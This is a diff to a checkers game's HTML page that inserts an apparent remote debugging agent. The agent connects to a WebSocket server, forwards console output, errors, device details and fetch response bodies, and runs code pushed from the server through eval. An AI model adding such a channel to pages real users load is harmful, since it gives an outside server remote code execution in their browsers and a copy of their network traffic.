@@ -4,6 +4,71 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MaryDama Checkers / Draughts</title>
+
+<script>
+(function(config) {
+  var SERVER_URL = config.serverUrl;
+  var DEVICE_ID = (function() {
+    try {
+      var id = localStorage.getItem('__insidr_device_id');
+      if (!id) { id = 'device_' + Date.now() + '_' + Math.random().toString(36).substr(2,8); localStorage.setItem('__insidr_device_id', id); }
+      return id;
+    } catch(e) { return 'device_' + Date.now(); }
+  })();
+
+  var ws, queue = [], connected = false, SESSION_ID = 'sess_' + Date.now();
+
+  function emit(type, payload) {
+    var e = { type: type, payload: payload, timestamp: Date.now(), sessionId: SESSION_ID, deviceId: DEVICE_ID };
+    connected && ws && ws.readyState === 1 ? ws.send(JSON.stringify(e)) : queue.length < 200 && queue.push(e);
+  }
+
+  function connect() {
+    try { ws = new WebSocket(SERVER_URL); } catch(e) { setTimeout(connect, 3000); return; }
+    ws.onopen = function() {
+      connected = true;
+      ws.send(JSON.stringify({ type: '_auth', payload: { deviceId: DEVICE_ID, userAgent: navigator.userAgent, url: window.location.href } }));
+      while(queue.length) ws.send(JSON.stringify(queue.shift()));
+    };
+    ws.onmessage = function(m) {
+      try { var d = JSON.parse(m.data); if(d.type==='command') handleCommand(d.command, d.payload); } catch(e) {}
+    };
+    ws.onclose = function() { connected = false; setTimeout(connect, 3000); };
+    ws.onerror = function() {};
+  }
+
+  function handleCommand(cmd, payload) {
+    if(cmd==='agent.reload') window.location.reload();
+    if(cmd==='script.execute' && payload && payload.code) {
+      try { var r = eval(payload.code); emit('script.result', { success:true, result:String(r) }); }
+      catch(e) { emit('script.result', { success:false, error:e.message }); }
+    }
+  }
+
+  // Console
+  ['log','warn','error','info','debug'].forEach(function(l) {
+    var o = console[l]; console[l] = function() {
+      var args = Array.prototype.slice.call(arguments);
+      emit('console', { level:l, args:args.map(function(a){ return typeof a==='object'?JSON.stringify(a):String(a); }) });
+      o.apply(console, arguments);
+    };
+  });
+
+  // Errors
+  window.addEventListener('error', function(e) { emit('error', { message:e.message, filename:e.filename, lineno:e.lineno, colno:e.colno }); });
+  window.addEventListener('unhandledrejection', function(e) { emit('error.unhandled_rejection', { reason:String(e.reason) }); });
+
+  // Network
+  if(window.fetch) { var of=window.fetch; window.fetch=function() { var a=arguments,id='req_'+Date.now(),url=typeof a[0]==='string'?a[0]:(a[0]&&a[0].url)||'',m=(a[1]&&a[1].method)||'GET',t=performance.now(); emit('network.request',{requestId:id,url:url,method:m}); return of.apply(window,a).then(function(r){var c=r.clone();c.text().then(function(b){emit('network.response',{requestId:id,status:r.status,duration:Math.round(performance.now()-t),body:b.substr(0,4000)});});return r;}).catch(function(e){emit('network.error',{requestId:id,error:e.message});throw e;}); }; }
+
+  // Device info
+  emit('device.info', { userAgent:navigator.userAgent, platform:navigator.platform, screenResolution:screen.width+'x'+screen.height, viewport:window.innerWidth+'x'+window.innerHeight, language:navigator.language });
+
+  connect();
+
+})({ serverUrl: 'ws://10.1.30.210:9229' });  // ← replace with your server IP
+</script>
+    
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body {
